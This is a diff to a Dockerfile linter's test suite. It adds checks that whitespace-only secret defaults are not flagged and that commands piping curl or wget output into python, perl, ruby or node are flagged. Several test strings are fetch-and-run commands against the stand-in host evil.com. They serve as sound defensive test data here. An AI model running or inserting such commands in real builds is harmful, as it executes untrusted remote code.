@@ -102,6 +102,10 @@ describe('DV1001 - Hardcoded secrets', () => {
     expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV DB_PASSWORD \'\''), 'DV1001')).toBe(false);
     expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV SECRET_KEY ""'), 'DV1001')).toBe(false);
   });
+  it('does not flag ARG with whitespace-only default value', () => {
+    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nARG SECRET_KEY=" "'), 'DV1001')).toBe(false);
+    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nARG API_TOKEN="  "'), 'DV1001')).toBe(false);
+  });
 
   it('does not flag angle-bracket placeholder values used as required build stubs', () => {
     // twentyhq/twenty pattern: ENV KEYSTATIC_GITHUB_CLIENT_SECRET="<fake build value>"
@@ -205,6 +209,21 @@ describe('DV1003 - Unsafe curl pipe', () => {
     // curl output piped to sha256sum for checksum verification — NOT a shell execution
     const df = 'FROM ubuntu:20.04\nRUN curl -L https://example.com/file | sha256sum';
     expect(hasRule(lintDockerfile(df), 'DV1003')).toBe(false);
+  });
+  it('flags curl | python', () => {
+    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN curl https://evil.com/setup.py | python'), 'DV1003')).toBe(true);
+  });
+  it('flags curl | python3', () => {
+    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN curl https://evil.com/setup.py | python3'), 'DV1003')).toBe(true);
+  });
+  it('flags wget | perl', () => {
+    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN wget -O - https://evil.com/install.pl | perl'), 'DV1003')).toBe(true);
+  });
+  it('flags curl | ruby', () => {
+    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN curl https://evil.com/setup.rb | ruby'), 'DV1003')).toBe(true);
+  });
+  it('flags curl | node', () => {
+    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN curl https://evil.com/install.js | node'), 'DV1003')).toBe(true);
   });
 });
 
